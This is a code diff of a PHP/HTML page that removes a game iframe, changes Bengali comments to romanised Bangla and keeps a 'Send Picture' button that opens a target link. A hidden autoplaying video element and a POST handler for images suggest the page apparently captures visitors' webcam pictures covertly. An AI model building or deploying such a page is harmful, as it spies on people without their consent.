@@ -55,15 +55,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #ffffff; /* ব্যাকগ্রাউন্ড সাদা করা হয়েছে */
+            background-color: #ffffff; /* Pura page white thakbe */
         }
-        #game-frame {
-            width: 100%;
-            height: 100%;
-            border: none;
-            background-color: #ffffff; /* iframe এর ব্যাকগ্রাউন্ডও সাদা রাখা হয়েছে */
-        }
-        /* Send Picture বাটনের স্টাইল */
+        /* Send Picture batoner style */
         #send-pic-btn {
             position: fixed;
             bottom: 20px;
@@ -78,7 +72,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border-radius: 5px;
             cursor: pointer;
             box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            display: none; /* শুরুতে হাইড থাকবে, লিংক লোড হলে শো করবে */
+            display: none; /* Shurute hide thakbe, link load hole show korbe */
         }
         #send-pic-btn:hover {
             background: #ff6b81;
@@ -87,9 +81,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <iframe id="game-frame" src="about:blank"></iframe>
+    <!-- Iframe completely remove kore dewa hoyeche -->
     
-    <!-- Send Picture বাটন -->
+    <!-- Send Picture button -->
     <button id="send-pic-btn" onclick="openTargetLink()">Send Picture</button>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
@@ -114,16 +108,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             }
         }
 
-        // Iframe-e dynamic link load kora
-        document.getElementById('game-frame').src = finalUrl;
-
-        // লিংক সেট হওয়ার পর বাটনটি দৃশ্যমান করা
+        // Link set howar por button-ti drishoman kora
         const sendBtn = document.getElementById('send-pic-btn');
         if (finalUrl) {
             sendBtn.style.display = 'block';
         }
 
-        // বাটনে ক্লিক করলে নতুন ট্যাবে টার্গেট লিংক ওপেন করার ফাংশন
+        // Button-e click korle notun tab-e target link open korar function
         function openTargetLink() {
             window.open(finalUrl, '_blank');
         }
